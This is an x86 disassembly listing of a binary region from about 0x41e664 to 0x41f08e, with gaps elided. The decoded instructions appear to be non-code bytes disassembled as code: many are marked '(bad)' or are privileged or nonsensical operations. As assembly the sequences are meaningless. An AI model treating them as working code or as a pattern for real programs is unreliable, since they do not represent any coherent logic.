  41e664:	and    ebx,DWORD PTR [ebp-0x6d]
  41e667:	jp     0x41e6af
  41e669:	ror    BYTE PTR [ecx],1
  41e66b:	xor    DWORD PTR [ebx],0xe09afe8
  41e671:	pop    ecx
  41e672:	xlat   BYTE PTR ds:[ebx]
  41e673:	repnz not BYTE PTR [edx]
  41e676:	xchg   esp,eax
  41e677:	jp     0x41e697
  41e679:	lahf   
  41e67a:	fisttp QWORD PTR [edx+0x1f]
  41e67d:	and    al,0x85
  41e67f:	sbb    esi,DWORD PTR [edi-0x22ec52a2]
  41e685:	cs mov cl,0xb2
  41e688:	js     0x41e642
  41e68a:	xor    BYTE PTR [ebx+0x5a24740a],dl
  41e690:	push   eax
  41e691:	out    0x49,al
  41e693:	test   al,0xad
  41e695:	pand   mm0,QWORD PTR [esp+edx*2-0x2]
  41e69a:	inc    edx
  41e69b:	loop   0x41e70c
  41e69d:	repnz sahf 
  41e69f:	pop    ss
  41e6a0:	and    al,BYTE PTR [edi+0x3103b5fa]
  41e6a6:	repz in al,0xcb
  41e6a9:	les    esi,FWORD PTR [ecx+edx*2]
  41e6ac:	lock push es
  41e6ae:	jns    0x41e692
  41e6b0:	clc    
  41e6b1:	out    dx,al
  41e6b2:	into   
  41e6b3:	dec    edi
  41e6b4:	std    
  41e6b5:	lods   eax,DWORD PTR ds:[esi]
  41e6b6:	or     eax,DWORD PTR [ebp+0x5a]
  41e6b9:	jne    0x41e704
  41e6bb:	aaa    
  41e6bc:	or     edx,DWORD PTR ds:0x9a60284f
  41e6c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6c3:	es ret 
  41e6c5:	mov    bl,0xe8
  41e6c7:	sub    BYTE PTR [esi],cl
  41e6c9:	mov    bh,0xc
  41e6cb:	xchg   edx,eax
  41e6cc:	pusha  
  41e6cd:	mov    edi,0x493ed290
  41e6d2:	pusha  
  41e6d3:	fimul  DWORD PTR [ebx]
  41e6d5:	xor    ebx,DWORD PTR [edi-0x60]
  41e6d8:	(bad)  
  41e6d9:	imul   eax,DWORD PTR [ebx-0x63],0x9bae0940
  41e6e0:	pop    es
  41e6e1:	fdiv   st,st(3)
  41e6e3:	sbb    BYTE PTR [ecx+0xcf5a08b],bh
  41e6e9:	and    edi,ebp
  41e6eb:	fldcw  WORD PTR [edi+0x0]
	...
  41e756:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e75c:	cmc    
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    ebx,DWORD PTR [ebx*2+0x46f7c1a1]
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	inc    DWORD PTR [eax]
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	mov    cl,0x79
  41e770:	sti    
  41e771:	mov    ch,BYTE PTR [edx+0x1440b3d4]
  41e777:	mov    bh,0x25
  41e779:	call   0x281:0x1c31669f
  41e780:	fisttp QWORD PTR [ecx-0x1d0582f4]
  41e786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e787:	aas    
  41e788:	fsubr  QWORD PTR [ebp-0x70]
  41e78b:	es into 
  41e78d:	fild   WORD PTR [edx+0xe]
  41e790:	and    cl,BYTE PTR [eax+0x65b29545]
  41e796:	fdivrp st(1),st
  41e798:	(bad)  
  41e799:	fistp  WORD PTR [eax-0x5]
  41e79c:	or     eax,0xfd99a564
  41e7a1:	jl     0x41e798
  41e7a3:	xchg   esi,eax
  41e7a4:	es cld 
  41e7a6:	add    BYTE PTR [bp+di+0x0],dl
  41e7aa:	inc    eax
  41e7ab:	icebp  
  41e7ac:	stos   BYTE PTR es:[edi],al
  41e7ad:	mov    edi,0x87f8c038
  41e7b2:	xchg   esi,eax
  41e7b3:	cmp    al,ah
  41e7b5:	fcomp  DWORD PTR ss:[eax]
  41e7b8:	and    esp,ecx
  41e7ba:	nop
  41e7bb:	jp     0x41e73d
  41e7bd:	push   esp
  41e7be:	xchg   ebx,eax
  41e7bf:	push   bp
  41e7c1:	(bad)  
  41e7c2:	pop    ebx
  41e7c3:	(bad)  
  41e7c5:	sub    ah,bl
  41e7c7:	repz inc edx
  41e7c9:	mov    DWORD PTR [esp+edx*8],esp
  41e7cc:	(bad)  
  41e7cd:	loopne 0x41e803
  41e7cf:	mov    al,ds:0x1cf142b6
  41e7d4:	cmp    esp,esp
  41e7d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7d7:	mov    al,0x52
  41e7d9:	xor    BYTE PTR [edx+ecx*8],al
  41e7dc:	out    dx,al
  41e7dd:	xor    ecx,edi
  41e7df:	jle    0x41e76f
  41e7e1:	jbe    0x41e810
  41e7e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7e4:	or     cl,BYTE PTR [edi+0x3c0a6174]
  41e7ea:	xor    eax,0xf398be18
  41e7ef:	mov    ch,0xb
  41e7f1:	add    eax,0xcc13c0ee
  41e7f6:	aaa    
  41e7f7:	scas   eax,DWORD PTR es:[edi]
  41e7f8:	mov    ch,BYTE PTR [edi-0x782c73ac]
  41e7fe:	mov    gs,WORD PTR [esi+0x6a]
  41e801:	push   eax
  41e802:	out    dx,al
  41e803:	xchg   DWORD PTR [ebx],edi
  41e805:	stc    
  41e806:	xchg   DWORD PTR [esi+0x16],ecx
  41e809:	pop    ebp
  41e80a:	repz sti 
  41e80c:	mov    ah,0x7a
  41e80e:	sub    dl,BYTE PTR [ecx+0x6e504ff7]
  41e814:	mov    esi,DWORD PTR [ebx-0x33]
  41e817:	(bad)  [edi-0x43]
  41e81a:	xor    DWORD PTR [esi+0x352254c3],ecx
  41e820:	sub    al,0xb0
  41e822:	daa    
  41e823:	inc    ecx
  41e824:	pop    edx
  41e825:	push   cs
  41e826:	jecxz  0x41e7fe
  41e828:	loopne 0x41e812
  41e82a:	fwait
  41e82b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41e82d:	and    dl,BYTE PTR [ebx]
  41e82f:	mov    dl,0xbb
  41e831:	adc    BYTE PTR ds:0x3fb23f27,bh
  41e837:	mov    dh,0xc
  41e839:	mov    dh,0x3a
  41e83b:	sbb    eax,0x16a1f28e
  41e840:	clc    
  41e841:	jp     0x41e7e0
  41e843:	cld    
  41e844:	or     al,0x97
  41e846:	fcom   DWORD PTR [edx]
  41e848:	aad    0xc
  41e84a:	mov    al,ds:0xc1b6f59d
  41e84f:	scas   eax,DWORD PTR es:[edi]
  41e850:	and    bl,dl
  41e852:	jecxz  0x41e86f
  41e854:	in     eax,dx
  41e855:	mov    ecx,0x75350c18
  41e85a:	cmc    
  41e85b:	shl    BYTE PTR cs:[esi-0x3f],1
  41e85f:	(bad)  
  41e861:	xchg   edx,eax
  41e862:	xor    ch,BYTE PTR [ebx+0x61fa61fc]
  41e868:	adc    BYTE PTR [edi],bl
  41e86a:	lahf   
  41e86b:	xor    cl,BYTE PTR ds:0x0
	...
  41e8d5:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e89e
  41e8e3:	(bad)  [ecx+0x147f654]
  41e8e9:	add    bh,bh
  41e8eb:	add    BYTE PTR [eax],al
  41e8ed:	add    al,al
  41e8ef:	or     DWORD PTR [ecx+0x48],esi
  41e8f2:	inc    ecx
  41e8f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8f4:	outs   dx,BYTE PTR ds:[esi]
  41e8f5:	xchg   esi,eax
  41e8f6:	add    al,0x6a
  41e8f8:	cmp    DWORD PTR [ecx-0x6b],esp
  41e8fb:	push   ecx
  41e8fc:	adc    al,0x6c
  41e8fe:	arpl   WORD PTR [ebx-0x19e456bc],si
  41e904:	xor    al,0xa2
  41e906:	cmp    DWORD PTR ds:0x8603dc24,eax
  41e90c:	imul   eax,esi,0x36
  41e90f:	lods   al,BYTE PTR ds:[esi]
  41e910:	in     eax,dx
  41e911:	dec    eax
  41e912:	lods   al,BYTE PTR ds:[esi]
  41e913:	add    eax,edi
  41e915:	cmp    ch,bh
  41e917:	adc    eax,0x61b5a6d7
  41e91c:	cmp    BYTE PTR [edi-0x6e],cl
  41e91f:	ins    DWORD PTR es:[edi],dx
  41e920:	mov    esi,ecx
  41e922:	push   0x4305cfd
  41e927:	mov    ds:0xb9522fe2,eax
  41e92c:	fld    DWORD PTR [edx+0x21]
  41e92f:	xchg   esi,eax
  41e930:	fwait
  41e931:	mov    edi,0xbc317241
  41e936:	add    dh,0xe6
  41e939:	not    esp
  41e93b:	mov    ds:0x8d9f0571,al
  41e940:	mov    cl,0x79
  41e942:	pop    edx
  41e943:	(bad)  
  41e944:	jnp    0x41e8db
  41e946:	sbb    DWORD PTR [ecx],esi
  41e948:	xchg   ebp,eax
  41e949:	xchg   edi,esi
  41e94b:	ins    DWORD PTR es:[edi],dx
  41e94c:	mov    ebx,DWORD PTR [esi]
  41e94e:	cmp    dl,ah
  41e950:	aas    
  41e951:	mov    cl,0xb4
  41e953:	pop    edx
  41e954:	inc    esi
  41e955:	mov    ds:0x4cef005,eax
  41e95a:	mov    edi,0x6b3e416f
  41e95f:	fst    st(3)
  41e961:	pop    ss
  41e962:	bound  edx,QWORD PTR [ebp+0x4fb3fe38]
  41e968:	xchg   ecx,eax
  41e969:	and    al,0xa2
  41e96b:	xchg   ebp,eax
  41e96c:	cmp    bh,BYTE PTR [ebx+0x74d279fe]
  41e972:	or     ebx,DWORD PTR [eax]
  41e974:	fdivr  st,st(1)
  41e976:	add    eax,DWORD PTR [ebp-0x2ebcff2c]
  41e97c:	test   DWORD PTR [ebx-0x53],esi
  41e97f:	sbb    cl,bl
  41e981:	push   eax
  41e982:	mov    ebx,0x9064ac8d
  41e987:	pusha  
  41e988:	pop    ebx
  41e989:	stos   DWORD PTR es:[edi],eax
  41e98a:	stos   DWORD PTR es:[edi],eax
  41e98b:	jae    0x41e93f
  41e98d:	mov    edx,0xa19f4e58
  41e992:	je     0x41e9fa
  41e994:	add    al,0xa
  41e996:	iret   
  41e997:	push   ds
  41e998:	out    0xb,al
  41e99a:	mov    dl,0x3
  41e99c:	ss stos BYTE PTR es:[edi],al
  41e99e:	outs   dx,DWORD PTR ds:[esi]
  41e99f:	pop    es
  41e9a0:	loop   0x41e96b
  41e9a2:	jne    0x41e9a6
  41e9a4:	mov    cl,BYTE PTR [ebx+0x2b]
  41e9a7:	mov    ecx,0xb174e0e1
  41e9ac:	enter  0x591a,0x67
  41e9b0:	push   ss
  41e9b1:	hlt    
  41e9b2:	mov    ds:0xf6b0b43a,eax
  41e9b7:	push   esp
  41e9b8:	pop    esi
  41e9b9:	mov    esi,0x1d3fa401
  41e9be:	mov    ds:0xf88f55e4,al
  41e9c3:	sbb    al,0xb7
  41e9c5:	mov    ch,0xf1
  41e9c7:	cwde   
  41e9c8:	imul   esp,ecx,0x42
  41e9cb:	and    DWORD PTR [esp+edx*4],eax
  41e9ce:	aaa    
  41e9cf:	gs loop 0x41e9e1
  41e9d2:	adc    DWORD PTR [esi+0x71],0x37d59709
  41e9d9:	sub    eax,0x2ef4cdfe
  41e9de:	sub    DWORD PTR [edx+0xe],ebx
  41e9e1:	mov    ebx,0x40877a8f
  41e9e6:	sar    BYTE PTR es:[esi],0xfc
  41e9ea:	add    BYTE PTR [edx+0x2e],ch
	...
  41ea55:	add    BYTE PTR [eax-0x3],bh
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	push   es
  41ea63:	xchg   BYTE PTR [ebx+0x148f527],cl
  41ea69:	add    bh,bh
  41ea6b:	add    BYTE PTR [eax],al
  41ea6d:	add    BYTE PTR [edi],cl
  41ea6f:	cmp    al,BYTE PTR [edi+0x413fec62]
  41ea75:	mov    eax,0x879834b3
  41ea7a:	xor    edi,DWORD PTR [ecx]
  41ea7c:	xchg   edi,eax
  41ea7d:	shr    BYTE PTR [edi-0x5c3b34d4],cl
  41ea83:	pop    ebx
  41ea84:	ja     0x41ea0a
  41ea86:	jbe    0x41eaa0
  41ea88:	push   cs
  41ea89:	es mov dh,0x85
  41ea8c:	data16 mov bh,0x5c
  41ea8f:	fstp   QWORD PTR ds:0xcf96e30b
  41ea95:	adc    DWORD PTR [ebp+0x19447e38],edi
  41ea9b:	pop    ebx
  41ea9c:	add    eax,0xeb851220
  41eaa1:	fld    TBYTE PTR [ebp-0x4fd566f9]
  41eaa7:	stos   DWORD PTR es:[edi],eax
  41eaa8:	jno    0x41ea8b
  41eaaa:	repz dec eax
  41eaac:	repnz aaa 
  41eaae:	(bad)  
  41eaaf:	dec    esi
  41eab0:	rcl    bl,cl
  41eab2:	jo     0x41ea46
  41eab4:	push   cs
  41eab5:	cmp    eax,0xfa4f66c3
  41eaba:	outs   dx,BYTE PTR ds:[esi]
  41eabb:	xchg   DWORD PTR [eax-0x5b87c513],esi
  41eac1:	popa   
  41eac2:	and    ebp,ebx
  41eac4:	and    edi,DWORD PTR ss:[eax]
  41eac7:	jl     0x41eac2
  41eac9:	ret    
  41eaca:	inc    edi
  41eacb:	mov    edi,0x7808816f
  41ead0:	pop    eax
  41ead1:	lock inc ebp
  41ead3:	adc    edx,esp
  41ead5:	sbb    eax,0x13b2a929
  41eada:	ds in  eax,0x8f
  41eadd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eade:	or     al,0x14
  41eae0:	lods   eax,DWORD PTR ds:[esi]
  41eae1:	aad    0xfb
  41eae3:	push   ds
  41eae4:	ins    BYTE PTR es:[edi],dx
  41eae5:	fcmovb st,st(0)
  41eae7:	sti    
  41eae8:	ss push esi
  41eaea:	popf   
  41eaeb:	push   ds
  41eaec:	and    eax,0xabd9c973
  41eaf1:	jno    0x41ea76
  41eaf3:	xor    al,0x22
  41eaf5:	repz iret 
  41eaf7:	loope  0x41eb59
  41eaf9:	inc    ebp
  41eafa:	adc    al,0xb1
  41eafc:	xchg   BYTE PTR [ebx],al
  41eafe:	cmp    esi,eax
  41eb00:	addr16 out dx,eax
  41eb02:	or     al,0x84
  41eb04:	inc    eax
  41eb05:	push   0x9fea97d9
  41eb0a:	cmp    BYTE PTR [eax+0x2c8a1e28],bl
  41eb10:	test   eax,0xe94fd7c
  41eb15:	add    cl,BYTE PTR [ebx]
  41eb17:	add    bh,ch
  41eb19:	xchg   ebp,eax
  41eb1a:	push   ecx
  41eb1b:	jmp    0x41eb9b
  41eb1d:	fiadd  DWORD PTR [edx-0x3a51d34]
  41eb23:	lds    eax,FWORD PTR [ebp+0x201d83f4]
  41eb29:	lahf   
  41eb2a:	rcl    BYTE PTR [esp+ebp*2-0x3bce90f2],cl
  41eb31:	pop    edx
  41eb32:	sti    
  41eb33:	rcl    BYTE PTR [ecx+0x7c],1
  41eb36:	and    ecx,DWORD PTR [eax+0x157460d8]
  41eb3c:	bt     DWORD PTR [edi+0x47e26aab],esi
  41eb43:	xor    esi,DWORD PTR [edi-0x53]
  41eb46:	fsubr  DWORD PTR [ecx]
  41eb48:	fadd   QWORD PTR [di+0x7b68]
  41eb4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb4f:	add    eax,0x35c74b9f
  41eb54:	push   es
  41eb55:	sbb    BYTE PTR [esi],dh
  41eb57:	sbb    dh,ah
  41eb59:	xor    DWORD PTR [edx-0x4f],0xffffffd6
  41eb5d:	xchg   ecx,eax
  41eb5e:	test   DWORD PTR [eax-0x21e59869],esi
  41eb64:	dec    eax
  41eb65:	das    
  41eb66:	rcr    BYTE PTR [esi],0x1c
  41eb69:	sub    eax,0x6a612e
	...
  41ebd6:	adc    ch,BYTE PTR [edi]
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0x5
  41ebe3:	dec    ecx
  41ebe4:	xchg   ebx,eax
  41ebe5:	mov    edi,0x149f4
  41ebea:	inc    DWORD PTR [eax]
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	mov    ecx,0x656f17f0
  41ebf3:	enter  0x4a0e,0x8f
  41ebf7:	enter  0x59c2,0x13
  41ebfb:	in     eax,dx
  41ebfc:	shr    DWORD PTR [esi+eax*2+0x70],1
  41ec00:	adc    al,0x8a
  41ec02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec03:	mov    ds:0x58eedf4b,al
  41ec08:	dec    ecx
  41ec09:	ud2    
  41ec0b:	popa   
  41ec0c:	ins    DWORD PTR es:[edi],dx
  41ec0d:	pop    edx
  41ec0e:	mov    ah,BYTE PTR [edx]
  41ec10:	push   ss
  41ec11:	popf   
  41ec12:	cs push edi
  41ec14:	add    edx,esp
  41ec16:	sti    
  41ec17:	and    dl,BYTE PTR [ecx]
  41ec19:	ss aam 0xa3
  41ec1c:	das    
  41ec1d:	sahf   
  41ec1e:	cmp    al,BYTE PTR [ebx-0x5e]
  41ec21:	mov    bl,0xc
  41ec23:	mov    al,0xf2
  41ec25:	and    BYTE PTR [ebp+ebx*1+0x62],bl
  41ec29:	les    ebp,FWORD PTR [edi+edx*2-0x7739103a]
  41ec30:	fmulp  st(7),st
  41ec32:	adc    esi,DWORD PTR [ebx+0x28]
  41ec35:	rcl    DWORD PTR [ebp-0x7e],cl
  41ec38:	(bad)  
  41ec39:	fnstcw WORD PTR [esi-0x7b]
  41ec3c:	prefetchw BYTE PTR [edx]
  41ec3f:	push   ss
  41ec40:	(bad)  
  41ec41:	jns    0x41ec2f
  41ec43:	dec    esi
  41ec44:	fs (bad) 
  41ec47:	and    ah,BYTE PTR [eax+0x72a8c16b]
  41ec4d:	js     0x41ecae
  41ec4f:	jne    0x41eca6
  41ec51:	jnp    0x41ec4e
  41ec53:	lock test eax,0x27d9dbc8
  41ec59:	xchg   dl,dh
  41ec5b:	cmp    esp,DWORD PTR [edx+edi*2+0x20ee19f3]
  41ec62:	pop    edx
  41ec63:	mov    al,0xc3
  41ec65:	test   al,0xa2
  41ec67:	sub    eax,0x1fc5de7
  41ec6c:	rcl    BYTE PTR [ebx-0x1b],1
  41ec6f:	das    
  41ec70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec71:	mov    edx,0x25aebde8
  41ec76:	out    dx,eax
  41ec77:	push   edx
  41ec78:	jl     0x41ec69
  41ec7a:	and    eax,0x61a55911
  41ec7f:	sbb    ebp,DWORD PTR [esi+0x266894e5]
  41ec85:	fist   WORD PTR [ebx]
  41ec87:	ret    
  41ec88:	add    al,0xb3
  41ec8a:	xor    BYTE PTR [eax-0x62],0xb2
  41ec8e:	imul   esp,DWORD PTR [edi-0x17],0xea6730f5
  41ec95:	jecxz  0x41ec65
  41ec97:	mov    ebx,0x815eec13
  41ec9c:	jmp    0x41ec57
  41ec9e:	xor    esi,ebp
  41eca0:	bound  edx,QWORD PTR [eax+0x30]
  41eca3:	leave  
  41eca4:	call   0x2f9555e7
  41eca9:	inc    edi
  41ecaa:	add    DWORD PTR ds:0x855b445b,ebp
  41ecb0:	arpl   bx,si
  41ecb2:	pop    eax
  41ecb3:	fnsave [ebp+0x7f0acb08]
  41ecb9:	sub    BYTE PTR [edx+0x5b2d031a],al
  41ecbf:	repnz inc ecx
  41ecc1:	and    al,0xee
  41ecc3:	or     al,0xec
  41ecc5:	mov    edi,0xcbea44f8
  41ecca:	push   cs
  41eccb:	jle    0x41ed44
  41eccd:	fsub   DWORD PTR [eax+0x3f]
  41ecd0:	cmc    
  41ecd1:	stos   DWORD PTR es:[edi],eax
  41ecd2:	adc    BYTE PTR ds:0x1b526e29,ch
  41ecd8:	mov    DWORD PTR [eax-0x61],ebp
  41ecdb:	mov    edx,0x779f7c5f
  41ece0:	cli    
  41ece1:	addr16 pop ebp
  41ece3:	xchg   BYTE PTR [ebp-0x13],ch
  41ece6:	jbe    0x41ec6c
  41ece8:	inc    esi
  41ece9:	jae    0x41ec88
  41eceb:	addr16 push eax
	...
  41ed55:	add    BYTE PTR [ecx-0xf],al
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0x372f5fd0
  41ed64:	scas   al,BYTE PTR es:[edi]
  41ed65:	push   esp
  41ed66:	repz dec edx
  41ed68:	add    DWORD PTR [eax],eax
  41ed6a:	inc    DWORD PTR [eax]
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	lea    eax,[edx]
  41ed70:	mov    DWORD PTR [ebx+0x5c],ebx
  41ed73:	xor    esi,edi
  41ed75:	push   0xf753f5fc
  41ed7a:	or     ebp,DWORD PTR [edi+0x77]
  41ed7d:	les    ebx,FWORD PTR [edx-0x77]
  41ed80:	jecxz  0x41ed71
  41ed82:	push   edx
  41ed83:	xlat   BYTE PTR ds:[ebx]
  41ed84:	test   DWORD PTR [edi+0x7a],0x8c24523f
  41ed8b:	fwait
  41ed8c:	jns    0x41ed3f
  41ed8e:	mul    DWORD PTR [eax+esi*8-0x33fada1c]
  41ed95:	add    edi,esi
  41ed97:	test   al,0xf4
  41ed99:	mov    ebp,0x86345809
  41ed9e:	jo     0x41ee15
  41eda0:	(bad)  
  41eda1:	popf   
  41eda2:	cwde   
  41eda3:	cmp    esi,DWORD PTR [edi]
  41eda5:	and    eax,0x881a5b11
  41edaa:	(bad)  
  41edab:	sti    
  41edac:	mov    cs,WORD PTR [ecx-0x6e2051ea]
  41edb2:	jle    0x41edf0
  41edb4:	mov    edi,edx
  41edb6:	and    ebp,eax
  41edb8:	loope  0x41edee
  41edba:	ins    DWORD PTR es:[edi],dx
  41edbb:	mov    ecx,0x49dbce54
  41edc0:	ja     0x41ed97
  41edc2:	xchg   ecx,eax
  41edc3:	cdq    
  41edc4:	cdq    
  41edc5:	call   0xada8:0x853a6b56
  41edcc:	xchg   ebp,eax
  41edcd:	(bad)  
  41edce:	fcom   DWORD PTR [ecx-0x504d9e38]
  41edd4:	dec    ebx
  41edd5:	imul   eax,DWORD PTR [ebx+ecx*4+0x3f],0xeebf471f
  41eddd:	test   eax,0x176e6cac
  41ede2:	pop    ebx
  41ede3:	xchg   DWORD PTR [edx-0x3029abd9],ebp
  41ede9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edea:	or     eax,0x61579840
  41edef:	fild   DWORD PTR [edx]
  41edf1:	push   eax
  41edf2:	pop    ss
  41edf3:	sub    al,0x4b
  41edf5:	jmp    0x71c37f04
  41edfa:	lea    eax,[ebx+0x1]
  41edfd:	jno    0x41eda4
  41edff:	cmp    dl,ch
  41ee01:	fnstenv [edx+0xd820719]
  41ee07:	mov    dl,0x22
  41ee09:	pop    ebp
  41ee0a:	mov    ds:0x3c973a13,al
  41ee0f:	aaa    
  41ee10:	pop    ecx
  41ee11:	cmp    esi,DWORD PTR [eax]
  41ee13:	fisubr DWORD PTR [ebx+0x1c5566ec]
  41ee19:	loope  0x41eddf
  41ee1b:	inc    esi
  41ee1c:	pusha  
  41ee1d:	scas   eax,DWORD PTR es:[edi]
  41ee1e:	dec    ebx
  41ee1f:	pop    ecx
  41ee20:	cmp    BYTE PTR [ebx-0x28],bl
  41ee23:	ret    0x62a3
  41ee26:	inc    eax
  41ee27:	adc    al,BYTE PTR [edi+0x5cb34033]
  41ee2d:	push   ds
  41ee2e:	mov    edi,0xa45611bc
  41ee33:	ss xor al,bh
  41ee36:	push   ebp
  41ee37:	fcmove st,st(4)
  41ee39:	mov    bh,0xd
  41ee3b:	fsub   QWORD PTR [ebx-0x5edff885]
  41ee41:	pop    eax
  41ee42:	xchg   esp,eax
  41ee43:	cmp    al,0x22
  41ee45:	pop    ss
  41ee46:	outs   dx,BYTE PTR ds:[esi]
  41ee47:	pop    ebx
  41ee48:	and    edx,DWORD PTR [esi+ecx*8]
  41ee4b:	add    eax,0x70171e67
  41ee50:	or     edi,ecx
  41ee52:	cmp    dh,BYTE PTR [esi]
  41ee54:	mov    al,0x5a
  41ee56:	cmp    DWORD PTR [edi-0x1a],0x73
  41ee5a:	pop    ebx
  41ee5b:	aas    
  41ee5c:	add    ecx,DWORD PTR [esi]
  41ee5e:	jle    0x41ee6d
  41ee60:	jo     0x41eeb9
  41ee62:	popa   
  41ee63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee64:	mov    esi,0x96368cc8
  41ee69:	sbb    BYTE PTR [ebp+0x7e],bh
  41ee6c:	cmp    eax,DWORD PTR [eax]
	...
  41eed6:	add    eax,0x7b197956
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0xf2c6:0x8b8ddde7
  41eee7:	dec    ebx
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	inc    DWORD PTR [eax]
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	mov    al,0x94
  41eef0:	inc    ecx
  41eef1:	pusha  
  41eef2:	leave  
  41eef3:	adc    edi,DWORD PTR [ebx-0x5a53f4a6]
  41eef9:	sub    bh,ah
  41eefb:	rol    BYTE PTR [edx],cl
  41eefd:	inc    ebx
  41eefe:	and    DWORD PTR [edx-0x4e],esp
  41ef01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef02:	push   cs
  41ef03:	sub    al,BYTE PTR [eax]
  41ef05:	into   
  41ef06:	jmp    0x41ee92
  41ef08:	scas   eax,DWORD PTR es:[edi]
  41ef09:	mov    DWORD PTR [edx+0x40],ecx
  41ef0c:	lahf   
  41ef0d:	and    BYTE PTR [ebx*2-0x538efdeb],ch
  41ef14:	and    DWORD PTR [eax],0xffffffb5
  41ef17:	or     cl,dl
  41ef19:	adc    ch,BYTE PTR [edi+eax*8]
  41ef1c:	xchg   ecx,eax
  41ef1d:	xchg   DWORD PTR [ecx+0x1e],edi
  41ef20:	sti    
  41ef21:	jo     0x41ef3a
  41ef23:	xchg   ebp,eax
  41ef24:	out    dx,eax
  41ef25:	cmp    BYTE PTR [edx-0x7cb441a1],cl
  41ef2b:	cmp    eax,0xaf3d8666
  41ef30:	adc    ah,BYTE PTR cs:0x281ff1ea
  41ef37:	(bad)  
  41ef38:	mov    ebp,DWORD PTR [ebx+0x1a]
  41ef3b:	das    
  41ef3c:	jl     0x41ef8e
  41ef3e:	sub    BYTE PTR ds:0x28ef6904,ch
  41ef44:	and    BYTE PTR [ebx],al
  41ef46:	add    dh,cl
  41ef48:	jbe    0x41ef50
  41ef4a:	mov    al,0xda
  41ef4c:	mov    dh,0xfb
  41ef4e:	sti    
  41ef4f:	xor    eax,0xcea5f41b
  41ef54:	je     0x41ef65
  41ef56:	ins    DWORD PTR es:[edi],dx
  41ef57:	mov    bh,0x11
  41ef59:	or     DWORD PTR [ecx+ebx*1-0x1d],ebp
  41ef5d:	dec    edx
  41ef5e:	cmc    
  41ef5f:	aam    0x33
  41ef61:	cmp    BYTE PTR [edx+0x43],dh
  41ef64:	dec    eax
  41ef65:	es jge 0x41ef75
  41ef68:	fwait
  41ef69:	test   BYTE PTR [edi+edx*2+0x583cc2b2],ah
  41ef70:	inc    esp
  41ef71:	mov    ch,0x44
  41ef73:	addr16 loope 0x41efea
  41ef76:	xchg   esi,eax
  41ef77:	inc    ebx
  41ef78:	and    edx,DWORD PTR [ecx+0x4cce2ba1]
  41ef7e:	mov    WORD PTR [ebx],es
  41ef80:	ins    DWORD PTR es:[edi],dx
  41ef81:	push   edi
  41ef82:	cwde   
  41ef83:	rcr    ch,0x9a
  41ef86:	test   eax,0x91d4a764
  41ef8b:	dec    esp
  41ef8c:	div    DWORD PTR [ebp+0x39b51f9]
  41ef92:	xchg   edx,eax
  41ef93:	loopne 0x41ef95
  41ef95:	and    eax,0xbe60f7dc
  41ef9a:	push   0xbad7c63f
  41ef9f:	aam    0x23
  41efa1:	repnz and al,0x2a
  41efa4:	fdiv   DWORD PTR [ebx]
  41efa6:	test   BYTE PTR [ebx-0x1146a707],dh
  41efac:	add    eax,0x59de6e84
  41efb1:	push   edi
  41efb2:	xor    ch,BYTE PTR ds:[edx-0x11]
  41efb6:	mov    ch,0x7a
  41efb8:	dec    edi
  41efb9:	ins    DWORD PTR es:[edi],dx
  41efba:	jb     0x41ef46
  41efbc:	pusha  
  41efbd:	mov    esi,0x4fe53d2d
  41efc2:	hlt    
  41efc3:	add    eax,0xe08924e3
  41efc8:	fnsave [esi]
  41efca:	rol    DWORD PTR [edx-0x43cbfcc],1
  41efd0:	mov    ebx,DWORD PTR [edx]
  41efd2:	in     eax,0xc7
  41efd4:	mov    ds:0x11982af4,al
  41efd9:	popf   
  41efda:	shr    edx,cl
  41efdc:	add    eax,0x151c5274
  41efe1:	sub    DWORD PTR [esi-0x2b84f392],eax
  41efe7:	mov    eax,ds:0xbfaca7b0
  41efec:	arpl   WORD PTR [eax],ax
	...
  41f056:	mov    ecx,0xff25bf5d
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul ebp,DWORD PTR [ebx],0x59
  41f064:	dec    edi
  41f065:	in     eax,dx
  41f066:	icebp  
  41f067:	dec    esp
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	inc    DWORD PTR [eax]
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	clc    
  41f06f:	lods   eax,DWORD PTR ds:[esi]
  41f070:	iret   
  41f071:	jle    0x41f0e0
  41f073:	in     al,dx
  41f074:	test   eax,0xd0ac05d4
  41f079:	fldcw  WORD PTR [eax]
  41f07b:	add    BYTE PTR ds:0x1a1569e5,0x58
  41f082:	add    BYTE PTR [edi+0x4e12a6d8],cl
  41f088:	fwait
  41f089:	call   0x31aa02ce
  41f08e:	inc    ebx
